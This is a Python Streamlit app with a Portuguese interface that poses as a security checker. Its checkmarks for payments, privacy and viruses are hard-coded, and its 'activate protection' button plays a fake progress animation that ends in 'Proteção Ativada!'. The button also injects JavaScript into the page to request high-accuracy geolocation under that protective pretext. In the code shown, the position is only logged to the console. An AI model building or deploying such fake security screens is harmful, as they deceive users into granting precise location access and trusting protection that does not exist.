import streamlit as st
import streamlit.components.v1 as components
import time

# --- 1. CONFIGURAÇÃO E ESTILIZAÇÃO (MANTIDA IGUAL) ---
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { 
        width: 100%; 
        border-radius: 20px; 
        background-color: #262730; 
        color: white; 
        border: none; 
        height: 50px; 
        font-weight: bold;
    }
    
    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
        display: flex; justify-content: center; align-items: center;
        font-size: 40px; font-weight: bold; color: white;
        box-shadow: 0 0 20px rgba(0, 255, 127, 0.2);
    }
    .spin { animation: spin 2s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    """, unsafe_allow_html=True)

# --- 2. LOGICA DO POP-UP DE LOCALIZAÇÃO ---
# Criamos uma função JavaScript que será chamada quando o botão for clicado
js_code = """
<script>
function solicitarLocalizacao() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => { console.log("Permitido"); },
            (err) => { console.log("Erro"); },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }
}

// Escuta o clique no botão do Streamlit para disparar o pop-up do sistema
const botoes = window.parent.document.querySelectorAll('button');
botoes.forEach(btn => {
    if(btn.innerText.includes("ATIVAR PROTEÇÃO")) {
        btn.addEventListener('click', solicitarLocalizacao);
    }
});
</script>
"""

# --- 3. INTERFACE VISUAL ---
st.title("Verificar segurança")

placeholder_bolha = st.empty()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    # Injeta o script para abrir o pop-up de precisão
    components.html(js_code, height=0)
    
    # Inicia a animação da bolha
    for i in range(4, 101, 5):
        placeholder_bolha.markdown(f'<div class="circle-container"><div class="circle spin">{i}%</div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Ativada!")
else:
    # Estado inicial com 4%
    placeholder_bolha.markdown('<div class="circle-container"><div class="circle">4%</div></div>', unsafe_allow_html=True)

# Mensagem de status
st.warning("Permissão de localização negada ou indisponível.")
